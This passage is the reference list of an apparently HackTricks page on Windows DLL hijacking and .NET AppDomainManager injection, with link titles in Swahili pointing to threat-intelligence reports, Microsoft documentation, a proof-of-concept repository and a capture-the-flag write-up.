- [6] [Check Point Research – Nimbus Manticore Inapeleka Malware Mpya Inayolenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks Zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Mapacha wa Kidijitali: Muundo wa Kampeni za Uigaji Zinazobadilika Zinazosambaza Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Maslahi Yanayokutana: Uchambuzi wa Vikundi vya Vitisho Vinavyolenga Serikali ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni ya Kivamizi ya Kificho Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Uchambuzi wa Kina wa Toolkit ya Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Msururu wa HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Kufuatilia Kampeni za Ujasusi za 2026 za APT ya Iran Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Kipengele cha `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Kipengele cha `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Kipengele cha `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Kipengele cha `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Kipengele cha `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Kipengele cha `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Haraka na Hasira: Operesheni za Nimbus Manticore Wakati wa Mgogoro wa Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Vitendo vya Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Inalenga Serikali na Miundombinu Muhimu ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Kujenga Upya na Kugundua Windows DLL Search-Order Hijacking kwa Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Kujenga maktaba za native kwa Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports kwa Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Mpangilio wa utafutaji wa Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Muundo wa PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Kufichua Lahaja ya SectopRAT Iliyofichwa Ndani ya Programu Halali](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
